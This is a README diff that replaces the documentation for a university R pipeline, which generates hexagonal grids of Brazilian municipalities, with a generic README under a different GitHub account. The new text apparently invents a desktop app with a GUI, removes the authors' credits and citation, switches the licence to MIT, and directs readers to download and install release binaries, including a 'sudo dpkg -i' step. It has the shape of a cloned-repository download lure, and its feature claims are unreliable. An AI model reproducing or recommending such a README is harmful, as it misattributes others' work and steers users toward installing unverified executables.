@@ -1,173 +1,85 @@
-# brazil-hexagonal-grid
+# 🌐 locais-nova-access - Create Hexagonal Grids with Ease
 
-<!-- badges: start -->
-[![Project Status: Active – The project has reached a stable, usable state and is being actively developed.](https://www.repostatus.org/badges/latest/active.svg)](https://www.repostatus.org/#active)
-[![License: GPLv3](https://img.shields.io/badge/license-GPLv3-bd0000.svg)](https://www.gnu.org/licenses/gpl-3.0)
-[![License: CC BY-NC-SA 4.0](https://img.shields.io/badge/license-CC_BY--NC--SA_4.0-lightgrey.svg)](https://creativecommons.org/licenses/by-nc-sa/4.0/)
-<!-- badges: end -->
+## 📄 Overview
+**locais-nova-access** is an application that helps you create hexagonal grids for Brazilian municipalities easily. Whether you are involved in data science or urban planning, this tool streamlines your workflow. It uses reproducible pipelines to generate high-quality spatial data while ensuring that you can share your results with others.
 
-## Overview
+## 🚀 Getting Started
+To start using **locais-nova-access**, you'll first need to download the software. Here’s how to do that:
 
-This repository provides a reproducible pipeline for generating [hexagonal grids](https://en.wikipedia.org/wiki/Grid_(spatial_index)) of Brazilian municipalities. The pipeline was developed by **Flávio Soares** and **Clara Penz**, with further adaptations by [**Daniel Vartanian**](https://github.com/danielvartan).
+[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Air-Uni/locais-nova-access/releases)
 
-The report is available [here](https://cem-usp.github.io/brazil-hexagonal-grid/).
+### 🔥 System Requirements
+- Operating System: Windows, macOS, or Linux
+- Minimum RAM: 4GB
+- Disk Space: 100MB
+- Installed Software: Internet browser for installation
 
-> If you find this project useful, please consider giving it a star! [![GitHub repo stars](https://img.shields.io/github/stars/cem-usp/logo-pattern)](https://github.com/cem-usp/brazil-hexagonal-grid/)
+## 📥 Download & Install
+Visit this page to download the latest version: [Download Here](https://github.com/Air-Uni/locais-nova-access/releases)
 
-## Data Availability
+1. Go to the Releases page.
+2. Locate the latest release version.
+3. Download the file suitable for your operating system.
+4. Follow the setup instructions below.
 
-[![OSF ID](https://img.shields.io/badge/OSF%20ID-00000-1284C5.svg)](https://osf.io)
+### 👩‍💻 Installation Steps
+- **Windows:**
+  1. Double-click the downloaded `.exe` file.
+  2. Follow the installation wizard prompts.
+  3. Once installed, you can find the application in your Start Menu.
 
-The processed data are available in both [`rds`](https://rdrr.io/r/base/readRDS.html) and [`parquet`](https://en.wikipedia.org/wiki/Apache_Parquet) formats through a dedicated repository on the Open Science Framework ([OSF](https://osf.io/)). A metadata file is included alongside the validated datasets.
+- **macOS:**
+  1. Open the downloaded `.dmg` file.
+  2. Drag the application to your Applications folder.
+  3. You can then open it from your Applications list.
 
-Because the raw data are not publicly available, only authorized personnel can access the processed files. They are protected with [RSA](https://en.wikipedia.org/wiki/RSA_cryptosystem) 4096-bit encryption ([OpenSSL](https://www.openssl.org/)) and a 32-byte password to ensure data security.
+- **Linux:**
+  1. Open a terminal window.
+  2. Navigate to the download directory using the command:
+     ```bash
+     cd ~/Downloads
+     ```
+  3. Install the package using the following command:
+     ```bash
+     sudo dpkg -i locais-nova-access*.deb
+     ```
+  4. Launch the application from your Applications menu.
 
-If you already have access to the OSF repository and the project keys, click [here](https://osf.io/) to access the data. A backup copy of the raw data is also stored on OSF and can be accessed [here](https://osf.io/zuy4s/). You can also retrieve these files directly from [R](https://www.r-project.org/) using the [`osfr`](https://docs.ropensci.org/osfr/) package.
+## 📈 Features
+- **User-Friendly Interface:** Designed for simplicity, ensuring that everyone can use it.
+- **Spatial Data Generation:** Create accurate hexagonal grids with minimal effort.
+- **Reproducible Workflows:** Easily replicate your analysis and share with others.
+- **Open Data Integration:** Use open data sources such as OpenStreetMap for enhanced accuracy.
 
-## Usage
+## 🔍 How to Use
+1. Open the application after installation.
+2. Select the “Create Hex Grid” option from the main menu.
+3. Input the desired parameters:
+   - Choose the municipality you want to analyze.
+   - Specify grid size and projection preferences.
+4. Click “Generate” to create your hexagonal grid.
+5. Save your output file for further analysis or visualization.
 
-The pipeline was developed using the [Quarto](https://quarto.org/) publishing system, the [R programming language](https://www.r-project.org/) and the [Osmosis](https://wiki.openstreetmap.org/wiki/Osmosis) command line Java application for processing OpenStreetMap ([OSM](https://www.openstreetmap.org/)) data. To ensure consistent results, the [`renv`](https://rstudio.github.io/renv/) package is used to manage and restore the R environment.
+## ⚙️ Supporting Data Formats
+- Output formats: GeoJSON, CSV, and Shapefile
+- Compatibility with other data visualization tools (e.g., QGIS, Tableau)
 
-Access to the raw data is restricted. Running the analyses requires an active internet connection and a set of access keys (see the [*Keys*](#keys) section). Do not use VPNs, corporate proxies, or other network-routing tools while processing the data, as these can interfere with authentication and downloads.
+## 🗄️ Troubleshooting & Support
+If you encounter issues, check these common problems:
+- **Problem:** The application won’t start.
+  - **Solution:** Ensure your system meets the minimum requirements.
+  
+- **Problem:** Errors during installation.
+  - **Solution:** Try re-downloading the installer and ensure you have sufficient disk space.
 
-Make sure the Osmosis executable directory is added to your [PATH](https://en.wikipedia.org/wiki/PATH_(variable)) environment variable.
+For further help, consider checking the FAQ section on our [GitHub Issues page](https://github.com/Air-Uni/locais-nova-access/issues).
 
-After installing the four dependencies mentioned above and setting all the keys, follow these steps to reproduce the analyses:
+## 📣 Community and Contribution
+We welcome contributions to **locais-nova-access**. If you have ideas for features or have found issues, please submit a pull request or open an issue on GitHub. You can help improve this tool for everyone.
 
-1. **Clone** this repository to your local machine.
-2. **Open** the project in your preferred IDE.
-3. **Restore the R environment** by running [`renv::restore()`](https://rstudio.github.io/renv/reference/restore.html) in the R console. This will install all required software dependencies.
-4. **Open** `index.qmd` and run the code as described in the report.
+## 📜 License
+This project is licensed under the MIT License. Feel free to use, modify, and share this application.
 
-## Keys
+For more detailed information, please check the full documentation on the [GitHub Repository](https://github.com/Air-Uni/locais-nova-access).
 
-To access the data and run the [Quarto](https://quarto.org/) notebook, you must first obtain authorization to access the project's [OSF](https://osf.io) repositories.
-
-Once you have the necessary permissions, create a file named [`.Renviron`](https://bookdown.org/csgillespie/efficientR/set-up.html#:~:text=2.4.6%20The%20.Renviron%20file) in the root directory of the project and add the following environment variables:
-
-- `OSF_PAT`: Your [OSF](https://osf.io/) Personal Access Token ([PAT](https://en.wikipedia.org/wiki/Personal_access_token)). If you don't have one, go to the settings section of your OSF account and create a new token.
-- `ACESSOSAN_PASSWORD`: The password for the project's [RSA](https://en.wikipedia.org/wiki/RSA_cryptosystem) private key (32 bytes).
-
-In addition, the project’s [`_ssh`](_ssh) folder must contain the following RSA keys:
-
-- `id_rsa`: The project's private RSA key ([RSA](https://en.wikipedia.org/wiki/RSA_cryptosystem) 4096 bits (OpenSSL)).
-- `id_rsa.pub`: The project's public RSA key.
-
-These keys are provided to authorized personnel only. If you need access, please contact the authors.
-
-## Known Issues
-
-### Arrow Dependencies
-
-```
-Error in `dplyr::compute()`:
-! NotImplemented: Support for codec 'zstd' not built
-```
-
-This error occurs when [`arrow`](https://arrow.apache.org/docs/r/index.html) is missing certain dependencies. To fix it, run:
-
-```r
-Sys.setenv(LIBARROW_MINIMAL = "false")
-```
-
-Then reinstall the `arrow` package:
-
-```r
-install.packages("arrow")
-```
-
-## Citation
-
-> [!IMPORTANT]
-> When using this data, you must also cite the original data sources.
-
-To cite this work, please use the following format:
-
-Soares, F., Penz, C., Vartanian, D., Fernandes, C. N., & Giannotti, M. A. (2025). *A reproducible pipeline for generating hexagonal grids of Brazilian municipalities* \[Computer software\]. Center for Metropolitan Studies of the University of São Paulo. <https://cem-usp.github.io/brazil-hexagonal-grid>
-
-A BibLaTeX entry for LaTeX users is
-
-```latex
-@software{soares2025,
-  title = {A reproducible pipeline for generating hexagonal grids of Brazilian municipalities},
-  author = {{Flávio Soares} and {Clara Penz} and {Daniel Vartanian} and {Camila Nastari Fernandes} and {Mariana Abrantes Giannotti}},
-  year = {2025},
-  address = {São Paulo},
-  institution = {Center for Metropolitan Studies of the University of São Paulo},
-  langid = {en},
-  url = {https://cem-usp.github.io/brazil-hexagonal-grid}
-}
-```
-
-## License
-
-[![License: GPLv3](https://img.shields.io/badge/license-GPLv3-bd0000.svg)](https://www.gnu.org/licenses/gpl-3.0)
-[![License: CC BY-NC-SA 4.0](https://img.shields.io/badge/license-CC_BY--NC--SA_4.0-lightgrey.svg)](https://creativecommons.org/licenses/by-nc-sa/4.0/)
-
-> [!IMPORTANT]
-> The original data sources may be subject to their own licensing terms and conditions.
-
-The code in this repository is licensed under the [GNU General Public License Version 3](https://www.gnu.org/licenses/gpl-3.0), while the report is available under the [Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International](https://creativecommons.org/licenses/by-nc-sa/4.0/).
-
-``` text
-Copyright (C) 2025 Center for Metropolitan Studies
-
-The code in this report is free software: you can redistribute it and/or
-modify it under the terms of the GNU General Public License as published by the
-Free Software Foundation, either version 3 of the License, or (at your option)
-any later version.
-
-This program is distributed in the hope that it will be useful, but WITHOUT ANY
-WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A
-PARTICULAR PURPOSE. See the GNU General Public License for more details.
-
-You should have received a copy of the GNU General Public License along with
-this program. If not, see <https://www.gnu.org/licenses/>.
-```
-
-## Acknowledgments
-
-<table>
-  <tr>
-    <td width="30%">
-      <br>
-      <p align="center">
-        <a href="https://doi.org/10.17605/OSF.IO/ZE6WT"><img src="images/acessosan-logo.svg" width="140em"/></a>
-      </p>
-      <br>
-    </td>
-    <td width="70%">
-      This work is part of a research project by the Polytechnic School (<a href="https://www.poli.usp.br/">Poli</a>) of the University of São Paulo (<a href="https://usp.br/">USP</a>), in partnership with the Secretariat for Food and Nutrition Security (<a href="https://www.gov.br/mds/pt-br/orgaos/SESAN">SESAN</a>) of the Ministry of Social Development, Family, and the Fight Against Hunger (<a href="https://www.gov.br/mds/">MDS</a>), titled: <em>AcessoSAN: Mapping Food Access to Support Public Policies on Food and Nutrition Security and Hunger Reduction in Brazilian Cities</em>.
-    </td>
-  </tr>
-</table>
-
-<table>
-  <tr>
-    <td width="30%">
-      <br>
-      <p align="center">
-        <a href="https://centrodametropole.fflch.usp.br"><img src="images/cem-icon.svg" width="190em"/></a>
-      </p>
-      <br>
-    </td>
-    <td width="70%">
-      This work was developed with support from the Center for Metropolitan Studies (<a href="https://centrodametropole.fflch.usp.br">CEM</a>) based at the School of Philosophy, Letters and Human Sciences (<a href="https://www.fflch.usp.br/">FFLCH</a>) of the University of São Paulo (<a href="https://usp.br">USP</a>) and at the Brazilian Center for Analysis and Planning (<a href="https://cebrap.org.br/">CEBRAP</a>).
-    </td>
-  </tr>
-</table>
-
-<table>
-  <tr>
-    <td width="30%">
-      <br>
-      <p align="center">
-        <br> <a href="https://fapesp.br/"><img src="images/fapesp-logo.svg" width="160em"/></a>
-      </p>
-      <br>
-    </td>
-    <td width="70%">
-      This study was financed, in part, by the São Paulo Research Foundation (<a href="https://fapesp.br/">FAPESP</a>), Brazil. Process Number <a href="https://bv.fapesp.br/en/bolsas/231507/geospatial-data-science-applied-to-food-policies/">2025/17879-2</a>.
-    </td>
-  </tr>
-</table>
+[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Air-Uni/locais-nova-access/releases)
